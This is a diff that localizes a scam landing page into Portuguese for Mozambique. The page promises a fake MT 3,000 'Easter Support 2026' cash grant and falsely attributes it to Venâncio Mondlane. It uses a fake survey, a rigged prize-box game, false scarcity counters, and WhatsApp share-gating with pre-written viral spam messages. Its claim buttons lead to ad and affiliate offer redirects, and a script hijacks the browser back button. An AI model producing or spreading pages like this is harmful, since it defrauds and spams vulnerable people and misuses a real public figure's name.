@@ -286,43 +286,42 @@ button:hover {
  
     <div id="intro">
 <div class="app" id="app" v-cloak>
-  
-
-<vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+  <vue-modal :open="showInstructionsModal">
+<h2 class="heading heading--h1">Parabéns! As suas respostas foram guardadas</h2>
  
 <p class="paragraph">
-Now you have a chance to win MT 3.000 EASTER Support Grant cash prize<br><br>
-You have 3 chances ! we wish you good luck
+Agora você tem a chance de ganhar MT 3.000 em Apoio de Páscoa<br><br>
+Você tem 3 tentativas! Desejamos boa sorte
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Você precisa selecionar a caixa que contém o presente.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Começar
 </button>
 </vue-modal>
+
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Mais sorte na próxima vez</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Você tem (2) tentativas extras. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
 OK
 </button>
 </vue-modal>
+
 <vue-modal :open="showSuccessModal">
 <img src="https://elements-resized.envatousercontent.com/elements-video-cover-images/eed7dbad-e312-4b79-b2f0-1a17df61a699/video_preview/video_preview_0000.jpg?w=500&cf_fit=cover&q=85&format=auto&s=5655961f7b833e33c25d492591e04cf997ff4e688052648a03da32399bc1c6cc" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Parabéns! </h1>
 <p class="paragraph">
 
-
-Your Prize is: <b> MT 3.000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+O seu prémio é: <b> MT 3.000 em dinheiro</b><br>Siga as instruções na próxima página para levantar o seu prémio!
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
-Ok
+OK
 </button>
 </vue-modal>
   
@@ -334,155 +333,196 @@ Ok
   
 
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKNyYPaKUXECPxw8ycS-r7r1ZFOIdrql9_lJnTDM5_Ov-S_iwRDUu9gIhW8aG-5107ldsCumNceGOpqInRTcIOrZVj_iLI9Gcaw5DcgCmKA3uXeUqxhZwHuIPa3pPTvyJxu90fFs9yIq8vqJY9opYuYglHkZPJiBpQvFVrOkf_K5fbjox2CeFendV34YU/s1536/fyffjkk.jpg" style="width:100%;" />
+
 <h1 class="heading heading--h1">
-Welcome!
+Bem-vindo!
 </h1>
+
   <p class="paragraph">
-In celebration of <b>Easter 2026, the Easter Support Program 2026 has been launched — a community initiative designed to support families across Mozambique during this special season.</b>
+Em celebração da <b>Páscoa 2026, foi lançado o Programa de Apoio de Páscoa 2026 — uma iniciativa comunitária criada para apoiar famílias em todo Moçambique durante esta época especial.</b>
 <br>
-Answer the questions below to claim <b>MT 3.000 Cash Prize</b> for Food, business and education.
+Responda às perguntas abaixo para receber <b>MT 3.000 em dinheiro</b> para alimentação, negócios e educação.
 </p>
   <br>
 
   </div>
 </div>
+
 <div class="right">
+
 <vue-box-picker v-if="showBoxPicker" :vertical-items="4" lid-image="https://i.imgur.com/HSX0Uhw.png" box-image="https://i.imgur.com/45mMPJQ.png" box-back-image="https://i.imgur.com/HSmfDGb.png" prize-image="https://elements-resized.envatousercontent.com/elements-video-cover-images/eed7dbad-e312-4b79-b2f0-1a17df61a699/video_preview/video_preview_0000.jpg?w=500&cf_fit=cover&q=85&format=auto&s=5655961f7b833e33c25d492591e04cf997ff4e688052648a03da32399bc1c6cc" v-on:fail="onBoxPickerFail" v-on:success="onBoxPickerSuccess" :horizontal-items="3" :max-clicks="2"></vue-box-picker>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
-              "Please wait a moment..."
+                     "Por favor aguarde um momento...",
+              "Por favor aguarde um momento...",
+              "Por favor aguarde um momento..."
             ]'>
 </vue-text-rotator>
+
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Você respondeu 4/4 perguntas
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
+
 <div class="verify__text" v-else>
-Your answers are being processed
+As suas respostas estão a ser processadas
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
+
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+Ainda há prémios disponíveis!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
+
 <div class="verify__text" v-else>
-Looking for gifts.. 
+A procurar prémios...
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
+
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (389) gifts remain!
+Apenas (389) prémios restantes!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
+
 <div class="verify__text" v-else>
-Stock is being checked
+A verificar disponibilidade
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
+
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "How will you use this funds?",
-              answers: [ { text: "Food" }, { text: "Shelter" }, { text: "Education" } ]
+              title: "Como você vai usar este dinheiro?",
+              answers: [ { text: "Alimentação" }, { text: "Habitação" }, { text: "Educação" } ]
             },
                                                               {
-              title: "Do you have an Account?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Você tem uma conta?",
+              answers: [ { text: "Sim" }, { text: "Não" } ]
             },
                
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Escolha o seu género?",
+              answers: [ { text: "Masculino" }, { text: "Feminino" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20 years" }, { text: "21 - 25 years" }, { text: "26 - 30 years" }, { text: "30 years Above" } ]
+              title: "Selecione a sua faixa etária?",
+              answers: [ { text: "18 - 20 anos" }, { text: "21 - 25 anos" }, { text: "26 - 30 anos" }, { text: "Acima de 30 anos" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
+
 </div>
 
-       <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiW0R0T1lWFkNNeSPG-mhcA8kOtqGussfJD4WkW7fM1_pkeAJlypgSASU93aPytNTIFq__pWEe69TXggckepRnqtv2imaZD5NvVbuAzipXLuIxOTEYUpxkCp7s1fopMDqwaMTuNjPlkEp8r4emzTzfK0DqXhyqlMT_qicdj9BRdHaAOdg8EhcmTiUX5Sm0/s630/csghan.jpg" style="width:100%;" />
+       <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqnnDI7OXBiNsYhFdjaaCmQYG_1Rw7SQILug_7GBTgxwQzXpla6Hp31HjoecAOW_8rQ2z8BSwtfnugwZjmhz7b3z1kaRAVZuWBy-twX6ZeyvotTEuaJNqimX6EIWuDeYuD_PqG9_yb9icj6Q_ErDF295pKGh_ogspRynIgr8mfVkHeyDQ93SEIA24w6d8/s630/ggg.jpg" style="width:100%;" />
   </div>
-      </div>
+</div>
   
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Parabéns! </p>
 </div>
+
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKNyYPaKUXECPxw8ycS-r7r1ZFOIdrql9_lJnTDM5_Ov-S_iwRDUu9gIhW8aG-5107ldsCumNceGOpqInRTcIOrZVj_iLI9Gcaw5DcgCmKA3uXeUqxhZwHuIPa3pPTvyJxu90fFs9yIq8vqJY9opYuYglHkZPJiBpQvFVrOkf_K5fbjox2CeFendV34YU/s1536/fyffjkk.jpg" width='81%'/> </center>
-                           
-
-                            </div>
-<p class="txt1">Your Prize is: <b>MT 3.000</b> <br>Follow the instructions below to your prize !</p>
-      <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1. Share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
-
-    
-   <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
-  <div class="barr">
-                <div class="fill">
-                    <div id="fill2"></div>
-                </div>
-                <div class="percentage center">
-                    <span><i class="fa fa-spinner fa-pulse"></i></span>
-                    <span id="percentage2">0%</span>
-                </div>
-    
-            <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
-                            </div>
-   
-  </div></div>
-  <br> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiW0R0T1lWFkNNeSPG-mhcA8kOtqGussfJD4WkW7fM1_pkeAJlypgSASU93aPytNTIFq__pWEe69TXggckepRnqtv2imaZD5NvVbuAzipXLuIxOTEYUpxkCp7s1fopMDqwaMTuNjPlkEp8r4emzTzfK0DqXhyqlMT_qicdj9BRdHaAOdg8EhcmTiUX5Sm0/s630/csghan.jpg" style="width:100%;" />
-  </div>
- 
-  
-
-  
-                      
-    <div id="claim">
-      <div class="title1">
-<p>Congratulations! </p>
+<center>
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKNyYPaKUXECPxw8ycS-r7r1ZFOIdrql9_lJnTDM5_Ov-S_iwRDUu9gIhW8aG-5107ldsCumNceGOpqInRTcIOrZVj_iLI9Gcaw5DcgCmKA3uXeUqxhZwHuIPa3pPTvyJxu90fFs9yIq8vqJY9opYuYglHkZPJiBpQvFVrOkf_K5fbjox2CeFendV34YU/s1536/fyffjkk.jpg" width='81%'/>
+</center>
 </div>
+
+<p class="txt1">O seu prémio é: <b>MT 3.000</b> <br>Siga as instruções abaixo para receber o seu prémio!</p>
+
+<div class="bottom" id='buttonO'>
+<div id="lastapp">
+<p class="rules">1. Partilhe com 5 grupos / 15 amigos no "WhatsApp" (clique no ícone do "WhatsApp" abaixo)</p>
+<p class="rules">2. Clique em "Continuar" e receba o seu prémio.</p>
+</div>
+
+<div class="share_main_bt" id="whatsapp">WhatsApp&nbsp; →</div>
+
+<h4 class="textlastup">Partilhe até a barra azul ficar completa!</h4>
+
+<div class="barr">
+<div class="fill">
+<div id="fill2"></div>
+</div>
+
+<div class="percentage center">
+<span><i class="fa fa-spinner fa-pulse"></i></span>
+<span id="percentage2">0%</span>
+</div>
+
+<br>
+
+<div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
+Continuar
+</div>
+
+</div>
+</div>
+
+<br>
+
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqnnDI7OXBiNsYhFdjaaCmQYG_1Rw7SQILug_7GBTgxwQzXpla6Hp31HjoecAOW_8rQ2z8BSwtfnugwZjmhz7b3z1kaRAVZuWBy-twX6ZeyvotTEuaJNqimX6EIWuDeYuD_PqG9_yb9icj6Q_ErDF295pKGh_ogspRynIgr8mfVkHeyDQ93SEIA24w6d8/s630/ggg.jpg" style="width:100%;" />
+</div>
+
+<div id="claim">
+
+<div class="title1">
+<p>Parabéns! </p>
+</div>
+
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
-                                <center>   <img src="https://elements-resized.envatousercontent.com/elements-video-cover-images/eed7dbad-e312-4b79-b2f0-1a17df61a699/video_preview/video_preview_0000.jpg?w=500&cf_fit=cover&q=85&format=auto&s=5655961f7b833e33c25d492591e04cf997ff4e688052648a03da32399bc1c6cc" width='81%'/> </center>
-                           
+<center>
+<img src="https://elements-resized.envatousercontent.com/elements-video-cover-images/eed7dbad-e312-4b79-b2f0-1a17df61a699/video_preview/video_preview_0000.jpg?w=500&cf_fit=cover&q=85&format=auto&s=5655961f7b833e33c25d492591e04cf997ff4e688052648a03da32399bc1c6cc" width='81%'/>
+</center>
+</div>
 
-                            </div>
-<p class="txt1">Your Prize is: <b>MT 3.000 cash.</b> <br>Follow the instruction below to claim your prize !</p>
-            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
-        <br>
-	    
-        <a  onclick="window.open('https://crn77.com/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM MT 3.000</font></button>
-                    </a><br/> <br/>
-	    
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+<p class="txt1">O seu prémio é: <b>MT 3.000 em dinheiro.</b> <br>Siga as instruções abaixo para levantar o seu prémio!</p>
 
-	     <a  onclick="window.open('https://crn77.com/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
-                    </a><br/> <br/>
- <a  onclick="window.open('https://crn77.com/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CURRENT</font></button>
-                    </a><br/> <br/>
-	
-                            
-            <div class="share_main_bt" id="offers">Withdraw MT 3.000</div> 
-      <br>
-          
+<p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+
+<br>
+
+<a onclick="window.open('https://crn77.com/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb">
+<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt">
+<font color="#ffffff">RECEBER MT 3.000</font>
+</button>
+</a>
+
+<br/> <br/>
+
+<div class="share_main_bt" id="offer">ESCOLHER TIPO DE CONTA</div>
+
+<br/> <br/>
+
+<a onclick="window.open('https://crn77.com/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb">
+<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt">
+<font color="#ffffff">POUPANÇA</font>
+</button>
+</a>
+
+<br/> <br/>
+
+<a onclick="window.open('https://crn77.com/4/8631702')" href="https://concurfortunes.com/ywq7t5nxkp?key=45ce2b2d436b9c40f21680a9b3c5cabb">
+<button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt">
+<font color="#ffffff">CORRENTE</font>
+</button>
+</a>
+
+<br/> <br/>
+
+<div class="share_main_bt" id="offers">Levantar MT 3.000</div>
+
+<br>
        
  
-  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiW0R0T1lWFkNNeSPG-mhcA8kOtqGussfJD4WkW7fM1_pkeAJlypgSASU93aPytNTIFq__pWEe69TXggckepRnqtv2imaZD5NvVbuAzipXLuIxOTEYUpxkCp7s1fopMDqwaMTuNjPlkEp8r4emzTzfK0DqXhyqlMT_qicdj9BRdHaAOdg8EhcmTiUX5Sm0/s630/csghan.jpg" style="width:100%;" /><br/>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqnnDI7OXBiNsYhFdjaaCmQYG_1Rw7SQILug_7GBTgxwQzXpla6Hp31HjoecAOW_8rQ2z8BSwtfnugwZjmhz7b3z1kaRAVZuWBy-twX6ZeyvotTEuaJNqimX6EIWuDeYuD_PqG9_yb9icj6Q_ErDF295pKGh_ogspRynIgr8mfVkHeyDQ93SEIA24w6d8/s630/ggg.jpg" style="width:100%;" /><br/>
     
 
 
@@ -519,9 +559,9 @@ function go() {
 
   <script>
         var text1 = "ytime" ,
-            text2 = " مكتبة جرير تقدم ",
-            text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            text2 = " Biblioteca JARIR apresenta ",
+            text3 = " Corra e receba o seu voucher antes que acabe aqui: ",
+            error = "Ocorreu um erro!\nAs partilhas não foram contabilizadas. Pode ter partilhado com o mesmo amigo ou grupo mais de uma vez, por favor partilhe novamente.",
             cpa = "https://crn77.com/4/8631702",
             cpa1 = "https://crn77.com/4/8631702",
             saved = "coke2",
@@ -530,10 +570,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "🇲🇿 *MT 3.000 EASTER Family Cash Support 2026:*%0A%0AIf you missed belfore, Don't miss this MT 3.000 EASTER Blessing By Venâncio Mondlane for All Mozambicans %0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive MT 3.000 Empowerment Funds instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://rhud.info/Apoio-Pascoa %0AWithdraw Here👇%0A https://rhud.info/Apoio-Pascoa  ",
-    "🇲🇿 *MT 3.000 EASTER Family Cash Support 2026:*%0A%0AIf you missed belfore, Don't miss this MT 3.000 EASTER Blessing By Venâncio Mondlane for All Mozambicans %0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive MT 3.000 Empowerment Funds instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://rhud.info/Apoio-Pascoa %0AWithdraw Here👇%0A https://rhud.info/Apoio-Pascoa  ",
-    "🇲🇿 *MT 3.000 EASTER Family Cash Support 2026:*%0A%0AIf you missed belfore, Don't miss this MT 3.000 EASTER Blessing By Venâncio Mondlane for All Mozambicans %0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive MT 3.000 Empowerment Funds instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://rhud.info/Apoio-Pascoa %0AWithdraw Here👇%0A https://rhud.info/Apoio-Pascoa  ",
-    "🇲🇿 *MT 3.000 EASTER Family Cash Support 2026:*%0A%0AIf you missed belfore, Don't miss this MT 3.000 EASTER Blessing By Venâncio Mondlane for All Mozambicans %0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive MT 3.000 Empowerment Funds instantly Today.%0A i just got mine%0A%0AClick Here👇%0A https://rhud.info/Apoio-Pascoa %0AWithdraw Here👇%0A https://rhud.info/Apoio-Pascoa  ",
+    "🇲🇿 *MT 3.000 Apoio Financeiro Familiar da Páscoa 2026:*%0A%0ASe perdeu a anterior, não perca esta Bênção da Páscoa de 3.000 MT, proferida por Venâncio Mondlane para todos os moçambicanos. %0A%0A*COMO CONSEGUIR*%0AAceda ao link abaixo, responda às seguintes perguntas e receba MT 3.000 em Fundos de Empoderamento instantaneamente hoje mesmo.%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://rhud.info/Apoio-Pascoa %0ARetire aqui👇%0A https://rhud.info/Apoio-Pascoa  ",
+    "🇲🇿 *MT 3.000 Apoio Financeiro Familiar da Páscoa 2026:*%0A%0ASe perdeu a anterior, não perca esta Bênção da Páscoa de 3.000 MT, proferida por Venâncio Mondlane para todos os moçambicanos. %0A%0A*COMO CONSEGUIR*%0AAceda ao link abaixo, responda às seguintes perguntas e receba MT 3.000 em Fundos de Empoderamento instantaneamente hoje mesmo.%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://rhud.info/Apoio-Pascoa %0ARetire aqui👇%0A https://rhud.info/Apoio-Pascoa  ",
+    "🇲🇿 *MT 3.000 Apoio Financeiro Familiar da Páscoa 2026:*%0A%0ASe perdeu a anterior, não perca esta Bênção da Páscoa de 3.000 MT, proferida por Venâncio Mondlane para todos os moçambicanos. %0A%0A*COMO CONSEGUIR*%0AAceda ao link abaixo, responda às seguintes perguntas e receba MT 3.000 em Fundos de Empoderamento instantaneamente hoje mesmo.%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://rhud.info/Apoio-Pascoa %0ARetire aqui👇%0A https://rhud.info/Apoio-Pascoa  ",
+    "🇲🇿 *MT 3.000 Apoio Financeiro Familiar da Páscoa 2026:*%0A%0ASe perdeu a anterior, não perca esta Bênção da Páscoa de 3.000 MT, proferida por Venâncio Mondlane para todos os moçambicanos. %0A%0A*COMO CONSEGUIR*%0AAceda ao link abaixo, responda às seguintes perguntas e receba MT 3.000 em Fundos de Empoderamento instantaneamente hoje mesmo.%0A acabei de receber o meu%0A%0AClique aqui👇%0A https://rhud.info/Apoio-Pascoa %0ARetire aqui👇%0A https://rhud.info/Apoio-Pascoa  ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -615,9 +655,9 @@ $("#offerss").click(function () {
 });
    function tipn(){
    Swal.fire({
-  icon: 'error',
-  title: 'Unfortunately...',
-  text: 'To Receive Your Cash Grant, You have to share with friends about our event. Share until the blue bar is full!',
+  icon: 'erro',
+  title: 'Infelizmente...',
+  text: 'Para receber o seu auxílio em dinheiro, precisa de partilhar o nosso evento com os seus amigos. Partilhe até que a barra azul esteja completa!',
   
 });
    }
@@ -640,4 +680,4 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 
 
-      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
+      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Partilhe ao máximo para receber um presente. ');		}}		catch (o){}}();</script>
